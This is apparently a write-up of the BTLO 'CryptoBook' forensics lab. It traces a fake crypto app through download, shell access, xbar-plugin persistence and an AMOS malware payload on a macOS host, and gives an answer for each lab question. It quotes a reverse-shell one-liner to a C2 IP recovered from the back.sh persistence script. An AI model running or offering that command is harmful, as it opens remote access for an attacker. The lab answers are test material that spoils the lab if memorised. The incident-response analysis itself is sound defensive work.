# 🚨 CryptoBook Investigation

---

## 🎯 Objective
Conduct a macOS-focused digital forensic investigation following a suspicious application installation on an employee workstation. Analyze system artifacts, persistence mechanisms, and indicators of compromise to determine whether the host was compromised and identify any remaining malicious activity.

---

## 🧾 Lab Details
- **Platform:** Blue Team Labs Online (BTLO)  
- **Lab:** CryptoBook  
- **Environment:** macOS  
- **Difficulty:** Hard  
- **OS:** Windows
- **Category:** Digital Forensics And Incident Response  

---

## 📖 Scenario
While attempting to find a reliable app to monitor live crypto market trends, Khaled, one of the IT employees at EZ-CERT, downloaded and installed an application on his MacBook.

After launching the application, he noticed that it did not behave as expected, which immediately raised suspicions about its legitimacy. Concerned that the application might be malicious, Khaled deleted it and reported the incident to the Incident Response (IR) team.

The following day, the IR team, led by Sarah and Ahmed, acquired a triage image of Khaled’s MacBook for further investigation.

The objective of the investigation is to determine whether any suspicious artifacts, persistence mechanisms, or indicators of compromise remain on the system and ensure that no lingering threats still exist on the host.

---

## 🛠️ Tools Used
- UnifiedLogReader  
- Spotlight Parser  
- FSE Parser  
- MRU Parser  
- SQLite3 DB Browser  
- Strings  
- Notepad++  

---

## 🔎 Investigation Overview
The investigation focuses on identifying the malicious application downloaded by the user, tracing attacker activity on the macOS system, identifying persistence mechanisms, and uncovering indicators of compromise left behind after the application was deleted.

By correlating browser history, Spotlight artifacts, Unified Logs, FSEvents, and persistence-related artifacts, it becomes possible to reconstruct the attacker’s activity and determine the overall impact on the host.

---

## Lab Discovery

In this lab, we are analyzing a macOS system after a suspicious cryptocurrency-related application was downloaded and executed by the user.

The investigation focuses on identifying the malicious application, tracing its execution and persistence activity, and determining whether the attacker left any indicators of compromise or malicious artifacts on the system.

---

## 🔍 Investigation Process

In most macOS DFIR investigations, I usually start by parsing the Unified Logs, FSEvents, Spotlight databases, and MRU artifacts to prepare them for analysis.

### Commands used for parsing:

```bash
.\unifiedlog_iterator.exe --mode log-archive --input "C:\Users\BTLOTest\Desktop\CryptoBook-Artefacts\EZ-CERT_20250320_215424\EZ-CERT-Triage\UnifiedLogs\EZ-CERT_20250320_215424.logarchive" --format csv --output logs.csv
python3 FSEParser_V4.1.py -s "/mnt/c/Users/BTLOTest/Desktop/CryptoBook-Artefacts/EZ-CERT_20250320_215424/EZ-CERT-Triage/fsevents/.fseventsd" -o "/mnt/c/Users/BTLOTest/Desktop/FSE_Output" -t folder
python2 macMRU.py "/mnt/c/Users/BTLOTest/Desktop/CryptoBook-Artefacts/EZ-CERT_20250320_215424/EZ-CERT-Triage/Users/khaled.allam/Library/Application-Support/com.apple.sharedfilelist" --blob_parse_human > Output.txt
python3 spotlight_parser.py "/mnt/c/Users/BTLOTest/Desktop/CryptoBook-Artefacts/EZ-CERT_20250320_215424/EZ-CERT-Triage/spotlight/.Spotlight-V100/Store-V2/C0DFC1E3-3C5F-4980-8054-0BF40FCF0308/.store.db" "/mnt/c/Users/BTLOTest/Desktop/spot/"
```

Q1) Khaled was searching for a reliable app to monitor live crypto trends. He found a website that looked promising and downloaded the application. What was the domain name of the site he downloaded the app from?

For the first question, the most logical place to start was the browser history, since the user mentioned downloading the application from a website.

In this case, I reviewed the Safari browsing history to identify recently visited domains related to cryptocurrency applications or downloads.

During the investigation, I found the following URL:

http://newscrypto.com/

This domain appeared directly within the browser history and matched the timeline related to the suspicious application download activity.

<img width="1549" height="842" alt="CryptoBook-Q1" src="https://github.com/user-attachments/assets/5515db69-e5e1-4bf5-ba23-3913a828bbf8" />


***Answer ==> newscrypto.com***

---

## Q2) Khaled initiated the download at a specific time. When exactly did this happen?

From the command history, it was clear that the application was downloaded using the following command:

```bash
curl -o CryptoUpdatesApp.dmg http://newscrypto.com/CryptoUpdatesApp.dmg
```
To identify the exact timestamp of the download activity, I correlated the command execution with the parsed Unified Logs around the beginning of the incident timeline.

This revealed the exact timestamp associated with the download request.

<img width="1550" height="840" alt="CryptoBook-Q2" src="https://github.com/user-attachments/assets/aa4f90bd-7dd5-497d-b0c8-5c28d71da576" />


***Answer ==> 2025-03-20T13:55:06.088Z***

Q3) The website provided instructions on how to install the application. It specifically recommended a built-in tool to bypass Gatekeeper restrictions. Which tool was suggested for the download?

While reviewing the command history, I identified the exact command used to download the suspicious disk image:

curl -o CryptoUpdatesApp.dmg http://newscrypto.com/CryptoUpdatesApp.dmg

This clearly showed that the built-in macOS tool recommended and used for the download was:

curl

Attackers commonly abuse native tools such as curl because they are trusted system binaries and can help bypass user suspicion and security restrictions like Gatekeeper.

***Answer ==> curl***

Q4) Once the download was complete, Khaled mounted the application as a disk image. What was the name of the mounted drive?

From the command history, I identified the following sequence of commands related to the downloaded application:

curl -o CryptoUpdatesApp.dmg http://newscrypto.com/CryptoUpdatesApp.dmg

hdiutil attach CryptoUpdatesApp.dmg

cp -R /Volumes/CryptoUpdatesApp/CryptoUpdates.app /Applications/\

hdiutil detach /Volumes/CryptoUpdatesApp

The hdiutil attach command mounts the DMG file as a disk image on macOS.

From this command, I identified the mounted drive name:

CryptoUpdatesApp

***Answer ==> CryptoUpdatesApp***

<img width="1551" height="842" alt="CryptoBook-Q1-Q2-Q3-Q4-related" src="https://github.com/user-attachments/assets/68318cac-d120-483d-917f-b21a13c4c382" />


---

Q5) Shortly after downloading, Khaled mounted the application. What was the exact timestamp when this happened?

From the previous question, I identified the command responsible for mounting the disk image:

hdiutil attach CryptoUpdatesApp.dmg

To identify when the mounting activity occurred, I searched the parsed Unified Logs for executions related to:

hdiutil

This revealed the timestamp associated with the mounting of the application disk image.

<img width="1548" height="825" alt="CryptoBook-Q5" src="https://github.com/user-attachments/assets/d5dc7cb2-c6c0-434f-a5cc-69ab5c614cd0" />

***Answer ==> 2025-03-20T13:56:06.820Z***

---
Q6) Following the mount, he moved the file to the Applications directory, likely intending to run it later. When did this action take place?

The following command was used to move the application into the macOS Applications directory:
```bash
cp -R /Volumes/CryptoUpdatesApp/CryptoUpdates.app /Applications/\
```
To confirm the exact timestamp of this activity, I correlated the command execution with both the Unified Logs and the parsed macMRU output.

Within the macMRU artifacts, I found the following entry:

Bookmark BLOB: Target Path [0x1004]: [u'Applications', u'CryptoUpdates.app']

Bookmark BLOB: Target CNID Path [0x1005]: [25523, 186558]

Bookmark BLOB: Containing Folder Index [0xc001]:None

Bookmark BLOB: Target Creation Date [0x1040]: 2025-03-20 13:56:47.246416+00:00

This timestamp corresponds to when the application was copied into the Applications directory.

<img width="1547" height="839" alt="CryptoBook-Q6" src="https://github.com/user-attachments/assets/acdaabcd-5f55-4bc4-88b0-3fb9f51fbde6" />

***Answer ==> 2025-03-20T13:56:47.246Z***

---
Q7) At some point, Khaled ran the application. When was his final recorded interaction with the file?

To answer this question, I reviewed the parsed Unified Logs for execution activity related to the malicious application process.

By searching for the application execution events and correlating them with the incident timeline, I identified the final recorded interaction associated with the file.

<img width="1552" height="841" alt="CryptoBook-Q7" src="https://github.com/user-attachments/assets/f1e561db-7fb7-4eef-a9de-e2eb75693b11" />


***Answer ==> 2025-03-20T14:01:56.780Z***
---

Q8) Unbeknownst to him, executing the file opened a remote connection to an attacker’s Command & Control (C2) server, providing unauthorized access to his system. Once connected, the attacker typed their first command. What was it?

After attackers gain initial access to a system, one of the most common commands they execute is:

whoami

This command allows the attacker to verify the current user context and confirm successful remote access to the compromised host.

To validate this, I searched the Unified Logs for executions related to the whoami command while paying close attention to the timeline immediately following the malicious application execution.

This confirmed the attacker’s first command.

<img width="1553" height="838" alt="CryptoBook-Q8" src="https://github.com/user-attachments/assets/c57bc7c4-e0a1-487a-9257-9930a96576de" />


***Answer ==> whoami***
---

Q9) During this session, the attacker used a legitimate tool to establish a more stable shell. What was the process ID (PID) of the shell they obtained?

One of the most common and legitimate tools attackers use to stabilize a shell session is:

/bin/bash

After gaining access, attackers often spawn /bin/bash to obtain a more interactive and reliable shell.

By filtering the Unified Logs for /bin/bash activity, I identified the following execution timestamp:

2025-03-20T14:02:38.036Z

The associated process ID tied to this shell session was:

<img width="1551" height="840" alt="CryptoBook-Q9" src="https://github.com/user-attachments/assets/3365ddb2-c43d-43ee-8276-d98c95741e43" />

***Answer ==> 2000***

---
Q10) The attacker wanted to maintain access, so they downloaded a file to ensure persistence. Where was this file stored on Khaled’s system?

While reviewing the artifacts, particularly the Full_file_listing.txt file, I identified a suspicious script named:

back.sh

The file was located in a directory commonly abused for persistence-related activity on macOS systems.

The full path identified was:

/System/Volumes/Data/Users/khaled.allam/Library/Application Support/xbar/plugins/back.sh

This strongly suggested the script was being used to maintain persistence on the compromised host.

<img width="1547" height="839" alt="CryptoBook-Q10" src="https://github.com/user-attachments/assets/5bf8fdfd-412e-4699-8603-0f1e74928ffa" />


***Answer ==> /System/Volumes/Data/Users/khaled.allam/Library/Application Support/xbar/plugins/back.sh***
---

Q11) When was this file written to the system?

To determine when the persistence script was written to the system, I reviewed the Spotlight artifacts related to back.sh.

Within the parsed Spotlight data, I identified the following metadata:

_kMDItemCreationDate --> 2025-03-20 14:04:02.720839

_kMDItemCreatorCode --> 0

_kMDItemDisplayNameWithExtensions --> back.sh

This revealed the timestamp associated with the creation of the persistence script on the system.

***Answer ==> 2025-03-20 14:04:02***

Q12) To maintain access, the attacker configured Khaled’s machine to connect to a C2 server whenever persistence was triggered. What were the IP address and port of the C2 server?

While reviewing the Spotlight metadata associated with back.sh, I also identified the following snippet embedded within the file contents:

_kMDItemSnippet --> #!/bin/bash?/bin/bash -c bash -i >& /dev/tcp/18.156.136.116/41148 0>&1

This command establishes a reverse shell connection to a remote command-and-control server whenever the persistence script is executed.

From this artifact, I identified the C2 server IP address and port.

***Answer ==> 18.156.136.116:41148***

<img width="1551" height="836" alt="CryptoBook-Q11-Q12" src="https://github.com/user-attachments/assets/d0177d64-bc9c-4367-a902-482ebef255cb" />

---

## Q13) At some point, the attacker lost access to the shell from their previous session. When did this occur?

For this question, the loss of shell access could indicate that the connection was interrupted, the process terminated, or the system was shut down.

To investigate this, I reviewed the Unified Logs for shutdown-related events and system activity around the time the attacker’s initial session ended.

By correlating the timeline with these events, I identified the point at which the attacker lost access to the compromised host.

<img width="1547" height="837" alt="CryptoBook-Q13" src="https://github.com/user-attachments/assets/3880b1bc-f017-46a2-b99e-b2cf5ed032e2" />

**Answer ==> 2025-03-20 14:10:36**

---

## Q14) However, because persistence had already been established, they regained access later. When did the attacker successfully reconnect?

This question was not immediately obvious, and it took some deeper log analysis to identify the attacker’s successful reconnection.

While reviewing the Unified Logs, I searched for indicators that would suggest a new remote session being established.

Eventually, I found the following log entry:

```text
***Connection to daemon established***
```
This event appeared at the following timestamp:

2025-03-21T04:00:44.998Z

This strongly indicates the moment the attacker successfully reconnected to the system through the persistence mechanism.

<img width="1553" height="837" alt="CryptoBook-Q14" src="https://github.com/user-attachments/assets/b6ad6419-c006-4df6-b130-45f6b43fbde3" />

***Answer ==> 2025-03-21 04:00:44***

---

Q15) Once reconnected, the attacker typed some commands to ensure access and then downloaded additional files onto Khaled’s system. What was the name of the downloaded file?

At first, I expected to find evidence of the download in the command history, but no related commands appeared there.

Since that approach did not provide results, I manually reviewed suspicious system locations, particularly temporary directories commonly used by attackers.

In the following path:

\private\tmp

I found a suspicious file named:

brew.dmg

To verify whether the file was malicious, I calculated its SHA-256 hash:

sha256sum brew.dmg

This returned:

**2958dfe9251c6bf997ceb94f2eea1b808a8e53bd5e79b7152f79379f441ede83**

Further analysis confirmed that this file was malicious.

<img width="1552" height="868" alt="CryptoBook-Q15" src="https://github.com/user-attachments/assets/93519eeb-5fa3-4ed3-acac-4452824b64f8" />

***Answer ==> Brew.dmg***

---
Q16) Interestingly, when the file was first downloaded, it had a different name before being renamed by the attacker. What was its original name?

To determine the original filename, I reviewed the parsed FSEvents output to identify file rename activity within the same directory where brew.dmg was located.

By filtering events under:

\private\tmp

I identified a file named:

file.txt

Based on the rename activity, this was the original name of the file before it was renamed by the attacker.

<img width="1551" height="868" alt="CryptoBook-Q16" src="https://github.com/user-attachments/assets/44e75f42-785e-4990-9447-3542bb9d76d0" />

***Answer ==> file.txt***

---

Q17) At what exact time did the attacker execute this file?

To identify when the malicious file was executed, I returned to the Unified Logs and searched for references related to:

brew

After reviewing the results and correlating the timeline, I found the execution event associated with the file.

The exact execution time was:

<img width="1549" height="844" alt="CryptoBook-Q17" src="https://github.com/user-attachments/assets/ad782045-3584-49c5-ac0f-2e4c16762bc0" />

***Answer ==> 2025-03-21 04:10:51***

---

Q18) A deeper analysis revealed that this file was actually malware. What is the malware family name it belongs to?

This final question was relatively straightforward.

After identifying the suspicious brew.dmg file earlier, I had already calculated its SHA-256 hash and performed OSINT research on it.

The analysis confirmed that the file belonged to the following malware family:

<img width="1915" height="943" alt="CryptoBook-Q18" src="https://github.com/user-attachments/assets/ce90b89d-db2d-469f-9793-805fa73e8e4e" />

***Answer ==> AMOS***

---
---

## Conclusion

This investigation revealed how a seemingly harmless crypto application led to a full compromise of a macOS system.

By correlating browser history, Unified Logs, Spotlight artifacts, FSEvents, and filesystem activity, I was able to trace the attacker’s actions from the initial download to persistence, reconnection, and the deployment of additional malware on the host.

The attacker relied heavily on legitimate macOS tools and normal user activity to blend in and maintain access without immediately raising suspicion.

In the end, the investigation confirmed that the final payload belonged to the AMOS malware family, highlighting how convincing fake crypto-related applications can be used to compromise macOS environments.

---

<img width="850" height="882" alt="cryptobookSOLVEDC" src="https://github.com/user-attachments/assets/54901d46-044e-4001-ab45-5c2dd493e525" />
